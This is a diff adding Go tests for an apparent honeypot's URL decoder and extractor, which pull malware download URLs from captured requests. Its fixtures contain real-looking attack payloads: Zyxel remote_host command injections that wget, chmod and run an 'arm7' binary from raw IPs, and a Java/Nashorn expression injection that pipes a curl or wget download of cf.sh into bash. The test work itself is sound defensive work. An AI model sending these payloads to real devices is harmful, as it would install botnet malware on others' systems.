@@ -1,12 +1,12 @@
 package backend
 
 import (
+	"fmt"
 	"loophid/pkg/database"
 	"testing"
 )
 
 func TestExtractUrls(t *testing.T) {
-
 	for _, test := range []struct {
 		description  string
 		textToSearch string
@@ -69,6 +69,146 @@ func TestExtractUrls(t *testing.T) {
 		})
 	}
 }
+
+var table = []struct {
+	input string
+}{
+	{input: "%22 sdd dsd s %25 sds %41"},
+	{input: "%22 %7d %7e %25"},
+	{input: "%22 %FF %7e %25"},
+}
+
+func BenchmarkSadencodeURL(b *testing.B) {
+	for _, v := range table {
+		b.Run(fmt.Sprintf("input_%s", v.input), func(b *testing.B) {
+			for i := 0; i < b.N; i++ {
+				roughDecodeURL(v.input)
+			}
+		})
+	}
+}
+
+func TestRoughDencodeURL(t *testing.T) {
+	for _, test := range []struct {
+		description    string
+		stringToDecode string
+		expectedResult string
+	}{
+		{
+			description:    "finds full url",
+			stringToDecode: "haha%22",
+			expectedResult: "haha\"",
+		},
+		{
+			description:    "traversal lowercase",
+			stringToDecode: "%2e%2e%2f",
+			expectedResult: "../",
+		},
+		{
+			description:    "ignores trailing %",
+			stringToDecode: "truncated string %",
+			expectedResult: "truncated string %",
+		},
+		{
+			description:    "ignores non ascii char",
+			stringToDecode: "aa %FF",
+			expectedResult: "aa %FF",
+		},
+		{
+			description:    "ignores lingering %",
+			stringToDecode: "aa % sdfsfdfd",
+			expectedResult: "aa % sdfsfdfd",
+		},
+	} {
+
+		t.Run(test.description, func(t *testing.T) {
+			res := roughDecodeURL(test.stringToDecode)
+			if res != test.expectedResult {
+				t.Errorf("got %s, expected %s", res, test.expectedResult)
+			}
+		})
+	}
+}
+
+func TestURLExtractor(t *testing.T) {
+	for _, test := range []struct {
+		description string
+		request     database.Request
+		urlsToFind  []string
+	}{
+		{
+			description: "Find URL in body",
+			urlsToFind:  []string{"http://www.example.org/"},
+			request: database.Request{
+
+				Uri:  "/ignored?aa=bb",
+				Raw:  "nothing",
+				Body: []byte("dsd http://www.example.org/ fd"),
+			},
+		},
+
+		{
+			description: "Find URL in body (encoded)",
+			urlsToFind:  []string{"http://192.210.162.147/arm7"},
+			request: database.Request{
+
+				Uri:  "/ignored?aa=bb",
+				Raw:  "ssadsa application/x-www-form-urlencoded ds",
+				Body: []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+			},
+		},
+
+		{
+			description: "Find URL in body (not encoded, with semi colon)",
+			urlsToFind:  []string{"http://192.210.162.147/arm7"},
+			request: database.Request{
+
+				Uri:  "/ignored?aa=bb",
+				Raw:  "ssadsads",
+				Body: []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
+			},
+		},
+		{
+			description: "Find URL in query string",
+			urlsToFind:  []string{"94.103.87.71/cf.sh"},
+			request: database.Request{
+
+				Uri:  "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
+				Raw:  "ssadsads",
+				Body: []byte(""),
+			},
+		},
+		{
+			description: "Find URL in body with + string",
+			urlsToFind:  []string{"http://185.225.73.177/arm7"},
+			request: database.Request{
+
+				Uri:  "/",
+				Raw:  "ssadsads Content-Type: application/x-www-form-urlencoded U",
+				Body: []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://185.225.73.177/arm7;chmod+777+arm7;./arm7 rep.zyxel;rm+-rf+arm7%"),
+			},
+		},
+	} {
+
+		t.Run(test.description, func(t *testing.T) {
+			result := make(map[string]struct{})
+
+			ex := NewURLExtractor(result)
+			ex.ParseRequest(&test.request)
+			if len(result) != len(test.urlsToFind) {
+				t.Errorf("expected %d, got %d urls (%v)", len(test.urlsToFind), len(result), result)
+			}
+
+			for _, a := range test.urlsToFind {
+				if _, ok := result[a]; !ok {
+					t.Errorf("not in: %s -> %v", a, result)
+				}
+			}
+
+		})
+	}
+}
+
 func TestFindBase64Strings(t *testing.T) {
 	for _, test := range []struct {
 		description   string
